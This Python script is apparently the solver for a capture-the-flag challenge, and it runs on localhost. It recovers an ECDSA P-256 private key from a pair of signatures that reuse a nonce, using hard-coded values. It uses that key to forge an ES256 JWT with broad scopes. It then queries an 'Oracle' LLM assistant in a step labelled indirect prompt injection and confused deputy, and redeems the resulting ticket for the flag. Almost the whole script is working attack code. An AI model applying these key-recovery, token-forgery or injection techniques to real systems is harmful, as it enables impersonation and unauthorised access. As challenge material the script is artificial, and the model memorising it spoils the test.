"""
Interactive solver for Steps 3, 4, and 5:
- Recovers the P-256 private key from the forensic pair
- Forges the ES256 JWT
- Queries the Oracle to trigger the prompt injection
- Redeems the ticket at the archive vault for the final flag
"""

import sys
import os
import json
import hashlib
import time
import requests
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.backends import default_backend
import jwt

# NIST P-256 curve order n
n = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551

# -------------------------------------------------------------
# STEP 3: CRYPTOGRAPHIC KEY RECOVERY & JWT GENERATION
# -------------------------------------------------------------
print("=" * 80)
print("STEP 3: ECDSA P-256 NONCE REUSE KEY RECOVERY")
print("=" * 80)

# The genuine pair extracted from forensics in Step 2:
m1 = {
    "action": "SEAL_TELEMETRY_LOG_1",
    "case_id": "CASE-KURUKSHETRA-SEAL11",
    "payload": {"flux": 412, "sensor": "GATE_NORTH", "status": "LOCKED"},
    "seq": 108,
    "timestamp": 1718064120
}

m2 = {
    "action": "SEAL_DISPATCH_RECORD_2",
    "case_id": "CASE-KURUKSHETRA-SEAL11",
    "payload": {"alert": "NIGHT_WATCH_SHADOW", "cleared": False, "origin": "OUTPOST_9"},
    "seq": 142,
    "timestamp": 1718064380
}

r = 0x2f03d8b4d9c339d0af6017e58d026db64c1e7f94c8ecc3309e043dc8e558939f
s1 = 0x20e8d72dd42dddad08f1c4977bcc409084ad36115dcfe848c455e888bd41c7b1
s2 = 0x3e883192ee7b1f1007c3abd1a882bc7b28dfd6ad97d5bc9320287efdd024dfe1

# Target public key announced in PCAP handshake
target_pub_hex = "04ff6641aa230347b47490ebc56ffd971602d98a5925c7cf2b21d7ab1eba970ad0c1fb0891d4928c9165926477c0fb32e9552541063a1833891af95ad1e14db091"
pub_x = int(target_pub_hex[2:66], 16)
pub_y = int(target_pub_hex[66:130], 16)

# Canonical JSON serialization (sorted keys, compact separators)
data1 = json.dumps(m1, sort_keys=True, separators=(',', ':')).encode('utf-8')
data2 = json.dumps(m2, sort_keys=True, separators=(',', ':')).encode('utf-8')
z1 = int.from_bytes(hashlib.sha256(data1).digest(), "big")
z2 = int.from_bytes(hashlib.sha256(data2).digest(), "big")

print(f"[+] Canonical Digest z1: 0x{z1:064x}")
print(f"[+] Canonical Digest z2: 0x{z2:064x}")

# ECDSA Nonce-Reuse Math with Low-S sign permutations:
# k = (z1 - z2) / (s1 - s2) mod n
# d = (s1 * k - z1) / r mod n
recovered_d = None
r_inv = pow(r, -1, n)

for sign1 in [1, -1]:
    for sign2 in [1, -1]:
        s1_c = (sign1 * s1) % n
        s2_c = (sign2 * s2) % n
        diff = (s1_c - s2_c) % n
        if diff == 0:
            continue
        k_cand = ((z1 - z2) * pow(diff, -1, n)) % n
        d_cand = ((s1_c * k_cand - z1) * r_inv) % n

        try:
            cand_key = ec.derive_private_key(d_cand, ec.SECP256R1(), default_backend())
            cand_pub = cand_key.public_key().public_numbers()
            if cand_pub.x == pub_x and cand_pub.y == pub_y:
                recovered_d = d_cand
                print(f"[+] Verified candidate against target public key Q!")
                break
        except Exception:
            continue
    if recovered_d:
        break

assert recovered_d is not None, "Failed to recover private key!"
print(f"\n[+] PRIVATE KEY RECOVERED SUCCESSFULLY!")
print(f"    d = 0x{recovered_d:064x}")

# Mint ES256 Bearer JWT for Oracle
now = int(time.time())
claims = {
    "iss": "relay.kurukshetra.seal11",
    "aud": "oracle.seal11.internal",
    "sub": "officer-relayer-11",
    "scope": "intel:read oracle:query archive:delegate",
    "case_id": "CASE-KURUKSHETRA-SEAL11",
    "iat": now,
    "exp": now + 3600
}
headers = {
    "alg": "ES256",
    "typ": "JWT",
    "kid": "relay-seal-eleven"
}

priv_key_obj = ec.derive_private_key(recovered_d, ec.SECP256R1(), default_backend())
token = jwt.encode(claims, priv_key_obj, algorithm="ES256", headers=headers)
print(f"\n[+] Minted ES256 Bearer JWT Token:")
print(f"    {token}\n")

# -------------------------------------------------------------
# STEP 4: ORACLE INQUIRY & INDIRECT PROMPT INJECTION
# -------------------------------------------------------------
print("=" * 80)
print("STEP 4: QUERYING THE ORACLE & EXPLOITING CONFUSED DEPUTY")
print("=" * 80)

base_url = "http://127.0.0.1:8000"
auth_header = {"Authorization": f"Bearer {token}"}

query_text = "Review incident logs and reconciliation status for CASE-KURUKSHETRA-SEAL11"
print(f"[*] Sending inquiry to Oracle Assistant: '{query_text}'...")

res_oracle = requests.post(
    f"{base_url}/api/oracle/query",
    headers=auth_header,
    json={"query": query_text}
)

if res_oracle.status_code != 200:
    print(f"[!] Oracle request failed: {res_oracle.status_code} - {res_oracle.text}")
    sys.exit(1)

oracle_data = res_oracle.json()
print(f"[+] Oracle Response Status: {oracle_data.get('status')}")
print(f"[+] Retrieved Documents  : {oracle_data.get('retrieved_documents')}")
print("\n--- Oracle Assistant Output ---")
print(oracle_data.get("oracle_response"))
print("-------------------------------\n")

# Extract the issued ticket ID
import re
match = re.search(r"TICKET-SEAL11-[a-f0-9]+", oracle_data.get("oracle_response", ""))
if not match:
    print("[!] Could not find ticket ID in response!")
    sys.exit(1)

ticket_id = match.group(0)
print(f"[+] Extracted Archive Ticket: {ticket_id}\n")

# -------------------------------------------------------------
# STEP 5: REDEEM TICKET AT ARCHIVE VAULT FOR FINAL FLAG
# -------------------------------------------------------------
print("=" * 80)
print("STEP 5: REDEEMING TICKET AT ARCHIVE VAULT")
print("=" * 80)

print(f"[*] Submitting ticket '{ticket_id}' to /api/archive/redeem...")
res_redeem = requests.post(
    f"{base_url}/api/archive/redeem",
    headers=auth_header,
    json={"ticket": ticket_id, "case_id": "CASE-KURUKSHETRA-SEAL11"}
)

if res_redeem.status_code != 200:
    print(f"[!] Vault redemption failed: {res_redeem.status_code} - {res_redeem.text}")
    sys.exit(1)

redeem_data = res_redeem.json()
archive_info = redeem_data.get("archive_details", {})
flag = archive_info.get("flag")

print("\n" + "#" * 80)
print(f"  VAULT UNSEALED: {archive_info.get('archive_name')}")
print(f"  CASE BINDING  : {archive_info.get('case_id')}")
print(f"  FINAL FLAG    : {flag}")
print("#" * 80 + "\n")
